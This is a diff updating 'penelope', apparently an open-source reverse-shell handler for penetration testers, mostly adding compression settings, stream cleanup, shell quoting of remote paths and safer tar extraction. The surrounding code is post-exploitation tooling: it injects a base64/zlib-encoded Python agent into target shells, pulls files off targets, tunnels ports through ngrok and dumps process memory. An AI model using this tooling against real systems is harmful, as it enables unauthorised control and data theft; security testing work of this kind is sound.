@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.21.7"
+__version__ = "0.21.10"
 
 import os
 import io
@@ -28,6 +28,7 @@ import ssl
 import time
 import gzip
 import json
+import zlib
 import shlex
 import queue
 import codecs
@@ -56,7 +57,6 @@ from math import ceil
 from glob import glob
 from json import dumps
 from code import interact
-from zlib import compress
 from errno import EADDRINUSE, EADDRNOTAVAIL
 from select import select
 from pathlib import Path, PureWindowsPath
@@ -3120,6 +3120,7 @@ class Session:
 
 			self.timeout_short = options.timeout_short
 			self.timeout_long = options.timeout_long
+			self.compression_level = options.compression_level
 
 			self.last_lines = LineBuffer(options.attach_lines)
 			self.lock = threading.Lock()
@@ -3302,7 +3303,11 @@ class Session:
 					self.streamID = self.streamID % self.streams_max
 
 				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
-				self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)
+				try:
+					self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)
+				except OSError as e:
+					logger.error(f"Cannot allocate stream: {e}")
+					return None
 
 				return self.streams[_stream_ID_hex]
 		else:
@@ -3556,7 +3561,7 @@ class Session:
 						"sh", "bash", "python", "python3", "uname",
 						"tty", "echo", "base64", "wget", "curl", "tar",
 						"rm", "stty", "find", "nc", "gzip", "chmod",
-						"tr", "sed", "stat", "awk", "tail", "cut", "df", "id",
+						"tr", "sed", "stat", "awk", "tail", "cut", "df", "id", "du",
 						"cat", "mkfifo", "grep", "mktemp"
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
@@ -3879,18 +3884,34 @@ class Session:
 					buffer = io.BytesIO()
 				timeout = self.timeout_short if value else None
 
+				own_stdin = stdin_stream is None
+				own_stdout = stdout_stream is None
+				own_stderr = stderr_stream is None
+				allocated_streams = []
+
+				def cleanup_allocated_streams():
+					for stream in allocated_streams:
+						stream.close()
+						self.streams.pop(stream.id, None)
+
 				if not stdin_stream:
 					stdin_stream = self.new_streamID
 					if not stdin_stream:
+						cleanup_allocated_streams()
 						return
+					allocated_streams.append(stdin_stream)
 				if not stdout_stream:
 					stdout_stream = self.new_streamID
 					if not stdout_stream:
+						cleanup_allocated_streams()
 						return
+					allocated_streams.append(stdout_stream)
 				if not stderr_stream:
 					stderr_stream = self.new_streamID
 					if not stderr_stream:
+						cleanup_allocated_streams()
 						return
+					allocated_streams.append(stderr_stream)
 
 				_type = 'S'.encode() if not python else 'P'.encode()
 				self.send(Messenger.message(
@@ -3911,11 +3932,13 @@ class Session:
 				if stderr_dst or value:
 					rlist.append(stderr_stream) # FIX
 				if not rlist:
+					if own_stdin:
+						try:
+							stdin_stream.write(b"")
+						except OSError:
+							pass
+					cleanup_allocated_streams()
 					return True
-
-				#rlist = [self.subchannel.control, stdout_stream, stderr_stream]
-				#if stdin_src:
-				#	rlist.append(stdin_src)
 
 				if not agent_control:
 					agent_control = self.subchannel.control # TEMP
@@ -3959,10 +3982,7 @@ class Session:
 							closing.discard(dst)
 
 					if not r and not w:
-						#stdin_stream.terminate()
-						#stdout_stream.terminate()
-						#stderr_stream.terminate()
-						break # TODO need to clear everything first
+						break # timeout
 
 					for readable in r:
 
@@ -3986,7 +4006,6 @@ class Session:
 								data = b""
 							stdin_stream.write(data)
 							if not data:
-								#stdin_stream << b""
 								if stdin_src in rlist:
 									rlist.remove(stdin_src)
 
@@ -4196,18 +4215,20 @@ class Session:
 				self.subchannel.result = self.subchannel.result.strip().decode(errors="replace") # TODO check strip
 			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
 
+			result, self.subchannel.result, self.subchannel.pattern = self.subchannel.result, None, None
+
 			if separate:
-				if not self.subchannel.result:
+				if not result:
 					with self.data_route_lock:
 						self.subchannel.active = False
 					return False
 				marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
-				idx = self.subchannel.result.find(marker, Messenger.LEN_BYTES)
+				idx = result.find(marker, Messenger.LEN_BYTES)
 				if idx < 0:
 					with self.data_route_lock:
 						self.subchannel.active = False
 					return False
-				framed_result = self.subchannel.result[idx - Messenger.LEN_BYTES:]
+				framed_result = result[idx - Messenger.LEN_BYTES:]
 				buffer = io.BytesIO()
 				for _type, _value in self.messenger.feed(framed_result):
 					buffer.write(_value)
@@ -4219,7 +4240,7 @@ class Session:
 			with self.data_route_lock:
 				self.subchannel.active = False
 
-			return self.subchannel.result
+			return result
 
 	def _deploy_standalone_python(self, url_key):
 		if not url_key:
@@ -4344,7 +4365,7 @@ class Session:
 					self.bin['sh'] or self.bin['bash'],
 					_exec
 				)
-				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
+				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
 				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
 				if self.pty_ready:
@@ -4564,7 +4585,7 @@ class Session:
 
 	@persistent_shell_only
 	@prefer_agent
-	@require('tar', 'base64', 'tr', 'cut')
+	@require('tar', 'base64', 'tr', 'cut', 'du')
 	def download(self, remote_items, download_folder=None, reroot=False):
 		if self.OS == 'Windows' and remote_items.count('"') % 2:
 			remote_items += '"'
@@ -4604,7 +4625,7 @@ class Session:
 					logger.error(response)
 					return []
 			else:
-				cmd = f"du -ck {' '.join(shell_escape_glob(os.path.join(self.cwd, part)) for part in shlex.split(remote_items))}"
+				cmd = f"du -ck {' '.join(shell_escape_glob(os.path.normpath(os.path.join(self.cwd, part))) for part in shlex.split(remote_items))}"
 				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot determine remote size")
@@ -4642,12 +4663,20 @@ class Session:
 						items.extend(_items)
 					else:
 						items.append(part)
-				import tarfile
+				import tarfile, zlib
 				if hasattr(tarfile, 'DEFAULT_FORMAT'):
 					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
 				else:
 					tarfile.TarFile.posix = True
-				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream, dereference={repr(options.link_dereference)}, bufsize=NET_BUF_SIZE)
+				_compression = {{}}
+				if sys.version_info >= (3, 12):
+					_compression['compresslevel'] = {self.compression_level}
+				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream, dereference={repr(options.link_dereference)}, bufsize=NET_BUF_SIZE, **_compression)
+				if not _compression:
+					try:
+						tar.fileobj.cmp = zlib.compressobj({self.compression_level}, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
+					except:
+						pass
 				def handle_exceptions(func):
 					def inner(*args, **kwargs):
 						try:
@@ -4691,13 +4720,14 @@ class Session:
 
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
-				remote_items = ' '.join([shell_escape_glob(os.path.join(self.cwd, part)) for part in shlex.split(remote_items)])
+				remote_items = ' '.join([shell_escape_glob(os.path.normpath(os.path.join(self.cwd, part))) for part in shlex.split(remote_items)])
 				remote_tmp = self.tmp
 				if not remote_tmp:
 					logger.error("No writable directory available on target for download staging")
 					return []
 				temp = remote_tmp + "/" + rand(8)
-				cmd = rf'tar -czf - {"-h " if options.link_dereference else ""}{remote_items}|base64|tr -d "\n" > {temp}'
+				qtemp = shlex.quote(temp)
+				cmd = rf'tar -czf - {"-h " if options.link_dereference else ""}{remote_items}|base64|tr -d "\n" > {qtemp}'
 				response = self.exec(cmd, timeout=None, value=True)
 				if response is False:
 					logger.error("Cannot create archive")
@@ -4706,9 +4736,9 @@ class Session:
 				for error in errors:
 					logger.error(error)
 				send_size = self.exec(
-					rf"(stat -x {temp} 2>/dev/null || stat {temp} 2>/dev/null) "
-					rf"| sed -n 's/.*Size: \([0-9]*\).*/\1/p' "
-					rf"| grep . || wc -c < {temp}",
+					rf"_s=$( (stat -x {qtemp} 2>/dev/null || stat {qtemp} 2>/dev/null) "
+					rf"| sed -n 's/.*Size: \([0-9]*\).*/\1/p' 2>/dev/null ); "
+					rf'[ -n "$_s" ] && echo "$_s" || wc -c < {qtemp}',
 					value=True
 				)
 				if not (isinstance(send_size, str) and send_size.strip().isdigit()):
@@ -4720,26 +4750,26 @@ class Session:
 				pbar = PBar(send_size, caption=f" {paint('⤷').softgreen} ", barlen=30, metric=Size, reverse=True)
 				b64data = io.BytesIO()
 				for offset in range(0, send_size, options.download_chunk_size):
-					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
+					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {qtemp}")
 					if response is False:
 						pbar.terminate()
 						logger.error("Download interrupted")
 						if self:
-							self.exec(f"rm {temp}")
+							self.exec(f"rm {qtemp}")
 						return []
 					b64data.write(response)
 					pbar.update(len(response))
-				self.exec(f"rm {temp}")
+				self.exec(f"rm {qtemp}")
 
-				data = io.BytesIO()
 				try:
-					data.write(gzip.decompress(base64.b64decode(b64data.getvalue())))
+					raw = base64.b64decode(b64data.getvalue())
 				except Exception:
 					logger.error("Invalid data returned")
 					return []
-				data.seek(0)
+				b64data.close()
 
-				tar_source, mode = data, "r:"
+				tar_source, mode = io.BytesIO(raw), "r:gz"
+				del raw
 
 			# Local extraction
 			try:
@@ -4945,12 +4975,12 @@ class Session:
 						remote_block_size = int(remote_block_size)
 						remote_space = int(remote_available_blocks) * remote_block_size
 			else:
-				remote_block_size = self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True)
+				remote_block_size = self.exec(rf'stat -c "%o" {shlex.quote(destination)} 2>/dev/null || stat -f "%k" {shlex.quote(destination)}', value=True)
 				if isinstance(remote_block_size, str) and remote_block_size.isdigit():
 					remote_block_size = int(remote_block_size)
 				else:
 					remote_block_size = None
-				remote_available_kb = self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)
+				remote_available_kb = self.exec(f"df -k {shlex.quote(destination)}|tail -1|awk '{{print $4}}'", value=True)
 				if isinstance(remote_available_kb, str) and remote_available_kb.isdigit():
 					remote_space = int(remote_available_kb) * 1024
 
@@ -5117,7 +5147,13 @@ class Session:
 				tar_buffer = io.BytesIO()
 				tar_destination, mode = tar_buffer, "r:gz"
 
-			tar = tarfile.open(mode='w|gz', fileobj=tar_destination, dereference=options.link_dereference, bufsize=options.network_buffer_size)
+			_compression = {}
+			if self.agent and sys.version_info >= (3, 12):
+				_compression['compresslevel'] = self.compression_level
+			tar = tarfile.open(mode='w|gz', fileobj=tar_destination, dereference=options.link_dereference,
+				bufsize=options.network_buffer_size, **_compression)
+			if self.agent and not _compression:
+				tar.fileobj.cmp = zlib.compressobj(self.compression_level, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
 
 			def handle_exceptions(func):
 				def inner(*args, **kwargs):
@@ -5172,36 +5208,39 @@ class Session:
 					pbar.update(pbar.end)
 
 			else:
-				tar_buffer.seek(0)
-				raw = tar_buffer.read()
-				data = base64.b64encode(raw).decode()
+				raw = tar_buffer.getvalue()
+				tar_buffer.close()
+				raw_size = len(raw)
 				remote_tmp = self.tmp
 				if not remote_tmp:
 					logger.error("No writable directory available on target for upload staging")
 					return []
 				temp = remote_tmp + "/" + rand(8)
+				qtemp = shlex.quote(temp)
 
 				logger.trace(paint(f"⇥ Uploading to {destination}").cyan)
-				pbar = PBar(len(raw), caption=f" {paint('⤷').softorange} ", barlen=30, metric=Size)
+				pbar = PBar(raw_size, caption=f" {paint('⤷').softorange} ", barlen=30, metric=Size)
+				slice_size = max(3, options.upload_chunk_size // 4 * 3)
 				sent = 0
-				for chunk in chunks(data, options.upload_chunk_size):
-					body = "\n".join(chunks(chunk, 512))
+				for offset in range(0, raw_size, slice_size):
+					chunk = base64.b64encode(raw[offset:offset + slice_size])
+					body = b"\n".join(chunks(chunk, 512)).decode()
 					term = "UP_" + rand(16)
-					response = self.exec(f"cat >> {temp} <<'{term}'\n{body}\n{term}\n:")
+					response = self.exec(f"cat >> {qtemp} <<'{term}'\n{body}\n{term}\n:")
 					if response is False:
 						pbar.terminate()
 						logger.error("Upload interrupted")
-						self.exec(f"rm {temp}")
+						self.exec(f"rm {qtemp}")
 						return []
-					sent += len(chunk)
-					pbar.update(int(len(raw) * sent / len(data)) - pbar.pos)
+					sent = min(offset + slice_size, raw_size)
+					pbar.update(sent - pbar.pos)
 
 				logger.debug(paint("--- Remote unpacking...").blue)
 				dest = f"-C {shlex.quote(remote_path)}" if remote_path else ""
-				cmd = f"{{ base64 -d 2>/dev/null || base64 -D; }} < {temp} | tar xz {dest} 2>&1; temp=$?"
+				cmd = f"{{ base64 -d 2>/dev/null || base64 -D; }} < {qtemp} | tar xz {dest} 2>&1; temp=$?"
 				response = self.exec(cmd, value=True)
 				exit_code = self.exec("echo $temp", value=True)
-				self.exec(f"rm {temp}")
+				self.exec(f"rm {qtemp}")
 				if not (isinstance(exit_code, str) and exit_code.strip() == "0"):
 					logger.error(response if response else "Remote unpacking failed or timed out")
 					return []
@@ -5537,9 +5576,6 @@ class Session:
 					stdout_dst=self.request,
 					agent_control=control
 				)
-				stderr_stream.close_read()
-				stderr_stream.close_write()
-				del session.streams[stderr_stream.id]
 
 		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 			allow_reuse_address = True
@@ -5713,11 +5749,15 @@ class Messenger:
 class Stream:
 	def __init__(self, _id, _session=None):
 		self.id = _id
-		self._read, self._write = os.pipe()
+		self.max_payload = Messenger.MAX_PAYLOAD - len(_id)
 		self.writebuf = None
 		self.feed_thread = None
 		self._feed_lock = threading.Lock()
 		self.session = _session
+		self.read_closed = True
+		self.write_closed = True
+		self._read = self._write = None
+		self._read, self._write = os.pipe()
 		self.read_closed = False
 		self.write_closed = False
 
@@ -5755,6 +5795,9 @@ class Stream:
 		return self._read
 
 	def write(self, data):
+		while len(data) > self.max_payload:
+			self.writefunc(data[:self.max_payload])
+			data = data[self.max_payload:]
 		self.writefunc(data)
 
 	def close_write(self):
@@ -5790,7 +5833,7 @@ class Stream:
 		return data
 
 def agent():
-	import os, sys, pty, shlex, fcntl, errno, struct, signal, termios, select, threading
+	import os, sys, tty, pty, shlex, fcntl, errno, struct, signal, termios, select, threading
 	signal.signal(signal.SIGINT, signal.SIG_DFL)
 	signal.signal(signal.SIGQUIT, signal.SIG_DFL)
 	normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
@@ -5831,7 +5874,7 @@ def agent():
 	if shell_pid == pty.CHILD:
 		os.execl(SHELL, SHELL, '-i')
 	try:
-		pty.setraw(pty.STDIN_FILENO)
+		tty.setraw(pty.STDIN_FILENO)
 	except:
 		pass
 	try:
@@ -5966,6 +6009,8 @@ def agent():
 							target_stream = streams.get(stream_id)
 							if target_stream is not None:
 								target_stream << data
+								if not data:
+									streams.pop(stream_id, None)
 
 				# Outgoing streams
 				else:
@@ -6047,7 +6092,7 @@ def upload_single_from_archive(session, url, member, arcname, remote_path=None):
 		logger.error(f"Failed to download {arcname}")
 		return False
 	buf = io.BytesIO(archive)
-	if member is None:                       # single-stream gzip
+	if member is None:
 		with gzip.GzipFile(fileobj=buf, mode="rb") as g:
 			data = g.read()
 	elif zipfile.is_zipfile(buf):
@@ -6058,7 +6103,7 @@ def upload_single_from_archive(session, url, member, arcname, remote_path=None):
 			except KeyError:
 				logger.error(f"File '{member}' not found in downloaded archive")
 				return False
-	else:                                    # tar.gz
+	else:
 		buf.seek(0)
 		with tarfile.open(fileobj=buf, mode="r:gz") as tf:
 			try:
@@ -6347,7 +6392,7 @@ class uac(Module):
 				logger.error("Failed to upload UAC")
 				return False
 			path = uploaded[0]
-			result = session.exec(f"tar xf {path} -C {session.exec_tmp} >/dev/null", value=True)
+			result = session.exec(f"tar xf {path} -C {shlex.quote(session.exec_tmp)} >/dev/null", value=True)
 			if not result:
 				session.exec(f"rm -f {path}")
 				logger.info(f"UAC successfully extracted on {session.exec_tmp}")
@@ -6356,9 +6401,9 @@ class uac(Module):
 				return False
 			# UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
 			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
-			base = re.sub(r'\.tar\.gz$', '', path)
-			session.uploaded_paths[base] = int(time.time())
-			cmd = f"cd {base}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
+			base = re.sub(r'\.tar\.gz$', '', shlex.split(path)[0])
+			session.uploaded_paths[shlex.quote(base)] = int(time.time())
+			cmd = f"cd {shlex.quote(base)}; ./uac -u -p ir_triage --output-format tar {shlex.quote(session.tmp)}"
 			#session.exec(cmd)
 			fd, tf = tempfile.mkstemp(prefix="penelope-", suffix=".sh")
 			with os.fdopen(fd, "w") as f:
@@ -6388,7 +6433,7 @@ class linux_procmemdump(Module):
 			print(session.exec(f"ps -eo pid,cmd", value=True))
 			logger.info(f"Please provide the PID of the process to be acquired:")
 			PID = input("PID: ")
-			session.exec(f"{session.exec_tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
+			session.exec(f"{shlex.quote(session.exec_tmp + '/linux_procmemdump.sh')} -p {PID} -s -d {shlex.quote(session.tmp)}")
 			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
 		else:
 			logger.error("This module runs only on Unix shells")
@@ -6474,12 +6519,12 @@ class ngrok(Module):
 				return False
 
 			token = input("Authtoken: ")
-			session.exec(f"{session.exec_tmp}/ngrok config add-authtoken {token}")
+			session.exec(f"{shlex.quote(session.exec_tmp + '/ngrok')} config add-authtoken {token}")
 			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
 			tcp_port = input("tcp_port: ")
 			#logger.info("Indicate if a TCP or an HTTP tunnel is required?:")
 			#tunnel = input("tunnel: ")
-			cmd = f"cd {session.exec_tmp}; ./ngrok tcp {tcp_port} --log=stdout"
+			cmd = f"cd {shlex.quote(session.exec_tmp)}; ./ngrok tcp {tcp_port} --log=stdout"
 			print(cmd)
 			#session.exec(cmd)
 			fd, tf = tempfile.mkstemp(prefix="penelope-", suffix=".sh")
@@ -6633,11 +6678,12 @@ class cleanup(Module):
 		Remove uploaded files and directories from the target
 		"""
 		for item in list(session.uploaded_paths.keys()):
-			p = item.strip('"').strip("'")
 			if session.OS == 'Unix':
-				response = session.exec(f'[ -e "{p}" ] && echo "exists" || echo "no"', value=True)
+				p = shlex.split(item)[0]
+				q = shlex.quote(p)
+				response = session.exec(f'[ -e {q} ] && echo "exists" || echo "no"', value=True)
 				if response == 'exists':
-					response = session.exec(f'rm -rf -- "{p}";echo $?', value=True)
+					response = session.exec(f'rm -rf -- {q};echo $?', value=True)
 					if response == '0':
 						logger.info(f"Deleted '{p}'")
 						del session.uploaded_paths[item]
@@ -6647,6 +6693,7 @@ class cleanup(Module):
 					logger.debug(f"'{p}' already gone")
 					del session.uploaded_paths[item]
 			else:
+				p = item.strip('"')
 				response = session.exec(f'cmd /Q /D /C if exist "{p}" (echo exists) else (echo no)', force_cmd=True, value=True)
 				if response == 'exists':
 					if session.subtype == 'cmd':
@@ -7269,11 +7316,11 @@ def get_glob_size(_glob, block_size, dereference=False):
 	return total_size
 
 def _is_within_directory(directory, target):
-       target = os.path.realpath(target)
-       try:
-               return os.path.commonpath([directory]) == os.path.commonpath([directory, target])
-       except ValueError:
-               return False
+	target = os.path.realpath(target)
+	try:
+		return os.path.commonpath([directory]) == os.path.commonpath([directory, target])
+	except ValueError:
+		return False
 
 def safe_tar_extractall(tar, dest, streaming=False, strip_prefixes=None):
 	dest_real = os.path.realpath(dest)
@@ -7289,6 +7336,7 @@ def safe_tar_extractall(tar, dest, streaming=False, strip_prefixes=None):
 					break
 			if not name:
 				return
+			tarinfo.name = name
 			targetpath = os.path.join(dest_real, name)
 
 		if not _is_within_directory(dest_real, targetpath):
@@ -7331,10 +7379,16 @@ def safe_tar_extractall(tar, dest, streaming=False, strip_prefixes=None):
 		extracted.append(targetpath)
 
 	tar._extract_member = guarded
-	import warnings
-	with warnings.catch_warnings():
-		warnings.simplefilter("ignore", category=DeprecationWarning)
-		tar.extractall(dest)
+	try:
+		if hasattr(tarfile, 'data_filter'):
+			tar.extractall(dest, filter='fully_trusted')
+		else:
+			tar.extractall(dest)
+	finally:
+		try:
+			del tar._extract_member
+		except AttributeError:
+			tar._extract_member = orig_extract_member
 	return extracted
 
 def windows_zip_script(remote_items, archive_path):
@@ -7639,6 +7693,7 @@ class Options:
 		self.upload_chunk_size = 1048576
 		self.download_chunk_size = 1048576
 		self.network_buffer_size = 32768
+		self.compression_level = 1
 		self.download_folder = ''
 		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
 		self.logfile = f"{__program__}.log"
@@ -7708,6 +7763,11 @@ class Options:
 			if isinstance(value, int) and value > _max:
 				show(f"network_buffer_size capped to {_max} (TLV frame limit)")
 				value = _max
+
+		elif option == 'compression_level':
+			if isinstance(value, int) and not 0 <= value <= 9:
+				value = min(max(value, 0), 9)
+				show(f"compression_level clamped to {value} (valid range: 0-9)")
 
 		elif option == 'no_bins':
 			if value is None:
@@ -8003,12 +8063,12 @@ stdout_handler = logging.StreamHandler()
 stdout_handler.setFormatter(CustomFormatter())
 stdout_handler.terminator = ''
 
-file_handler = logging.FileHandler(options.logfile)
+file_handler = logging.FileHandler(options.logfile, encoding='utf-8', errors='replace')
 file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
 file_handler.setLevel(logging.INFO)
 file_handler.terminator = ''
 
-debug_file_handler = logging.FileHandler(options.debug_logfile)
+debug_file_handler = logging.FileHandler(options.debug_logfile, encoding='utf-8', errors='replace')
 debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
 debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
 debug_file_handler.terminator = ''
@@ -8165,4 +8225,3 @@ load_rc()
 
 if __name__ == "__main__":
 	main()
-
